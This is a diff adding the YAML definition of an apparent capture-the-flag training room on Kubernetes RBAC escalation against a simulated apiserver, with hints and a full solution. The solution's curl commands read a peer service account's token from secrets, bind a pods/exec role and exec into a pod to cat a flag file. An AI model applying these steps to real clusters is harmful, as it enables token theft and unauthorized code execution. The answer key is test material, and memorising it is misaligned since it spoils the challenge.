@@ -1,0 +1,123 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: kubernetes-paper-walls
+  title: 'Kubernetes Paper Walls'
+  version: 1.0.0
+  difficulty: medium
+  points: 275
+  estimated_minutes: 50
+  tags: [cloud-concepts, kubernetes-simulation, rbac, service-account, escalation, simulation]
+spec:
+  track: defense-cloud
+  type: challenge
+  summary: >-
+    Kubernetes walls are made of RBAC paper, and paper grants leak.
+    This room runs a simulated apiserver over one namespace: a JSON
+    graph of service accounts, secrets, roles, and bindings with live
+    permission checks. You start as metrics-agent, whose token can read
+    every secret in the namespace, including another automation
+    account's bearer token. Wear that token, use its binding rights to
+    grant yourself exec, and climb into the running pod.
+  objectives:
+    - 'Map the namespace graph of service accounts, roles, and role bindings through the simulated API.'
+    - 'Abuse secret-read rights to steal a peer service account token from its mounted-token secret.'
+    - 'Escalate by creating a role binding that grants pods/exec, then exec into the pod for the flag.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'http://target:8000'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: >-
+      Dictionary-backed Flask apiserver; tokens are fixed strings, RBAC
+      is recomputed per request from an in-memory list, and the exec
+      endpoint returns canned text around the per-session flag. No
+      cluster, node, or container runtime exists behind any endpoint,
+      and the created binding evaporates on restart.
+  target:
+    privilege_profile: locked
+    build_context: ./target
+    ports: [8000]
+    healthcheck:
+      http_path: /healthz
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: rbac-escalation-exec
+      title: 'From secret reader to pod exec'
+      prompt: >-
+        The simulated apiserver at http://target:8000 serves namespace
+        prod. You hold metrics-agent's bearer token
+        sim-token-metrics-agent. Check your own effective rules first;
+        secret reads are only the beginning. Find which other service
+        account can create role bindings, steal its mounted token from
+        the secrets API, and continue as that identity. It cannot exec
+        yet, but it can write bindings: grant it a role that allows
+        pods/exec, verify your new powers, and POST an exec command into
+        the running pod to cat the flag file. Submit the FLAG value the
+        command prints.
+      points: 275
+      hints:
+        - cost: 0
+          text: >-
+            GET /apis/authorization.sim.io/v1/selfsubjectrulesreviews
+            with your bearer shows what metrics-agent may do. Then read
+            the rolebindings list under /apis/rbac.authorization.k8s.io/
+            v1/namespaces/prod/rolebindings and match each roleRef name
+            against the roles list to see who holds which power.
+        - cost: 10
+          text: >-
+            deploy-bot is bound to binding-admin. GET
+            /api/v1/namespaces/prod/serviceaccounts/deploy-bot names its
+            mounted-token secret; GET that secret and base64-decode the
+            data.token value to wear deploy-bot instead.
+        - cost: 25
+          text: >-
+            The prod-admin role carries pods/exec create. As deploy-bot,
+            POST to .../rolebindings with metadata.name
+            deploy-bot-escalated, roleRef prod-admin, subject deploy-bot.
+            Then POST /api/v1/namespaces/prod/pods/flagship-0/exec with
+            {"command":["cat","/var/run/secrets/flag.txt"]} and submit
+            the FLAG{...} in stdout.
+      solution: |
+        1. Establish identity and rights:
+           curl -H 'Authorization: Bearer sim-token-metrics-agent' \
+             http://target:8000/apis/authorization.sim.io/v1/selfsubjectrulesreviews
+           metrics-agent holds get,list on secrets plus get pods/log and
+           list pods. Secret reading is the lever this room hands you.
+        2. Map the graph:
+           curl -H ... http://target:8000/apis/rbac.authorization.k8s.io/v1/namespaces/prod/rolebindings
+           Three bindings exist: metrics-agent reads secrets and logs,
+           while deploy-bot holds binding-admin (create rolebindings).
+           The roles list confirms what each name means.
+        3. Steal the peer token:
+           curl -H ... http://target:8000/api/v1/namespaces/prod/serviceaccounts/deploy-bot
+           returns secrets: [deploy-bot-token]. Fetch it:
+           curl -H ... http://target:8000/api/v1/namespaces/prod/secrets/deploy-bot-token
+           The data.token field is base64; decode it to
+           sim-jwt-deploy-bot-9f4c2e.
+        4. Confirm the new shoes:
+           selfsubjectrulesreviews with the stolen bearer reports
+           deploy-bot, holding create rolebindings but no exec.
+        5. Escalate through the very right you stole:
+           curl -X POST \
+             -H 'Authorization: Bearer sim-jwt-deploy-bot-9f4c2e' \
+             -H 'Content-Type: application/json' \
+             -d '{"metadata":{"name":"deploy-bot-escalated"},"roleRef":{"kind":"Role","name":"prod-admin"},"subjects":[{"kind":"ServiceAccount","name":"deploy-bot"}]}' \
+             http://target:8000/apis/rbac.authorization.k8s.io/v1/namespaces/prod/rolebindings
+           RBAC recomputes live; deploy-bot now carries prod-admin's
+           create pods/exec.
+        6. Enter the workload:
+           List pods as deploy-bot to find flagship-0, then
+           curl -X POST -H 'Authorization: Bearer sim-jwt-deploy-bot-9f4c2e' \
+                -H 'Content-Type: application/json' \
+                -d '{"command":["cat","/var/run/secrets/flag.txt"]}' \
+                http://target:8000/api/v1/namespaces/prod/pods/flagship-0/exec
+           stdout prints FLAG{...}. Submit it, then reflect on why
+           namespace-wide secret read rights are rarely necessary.
+      validator:
+        type: per_session_flag
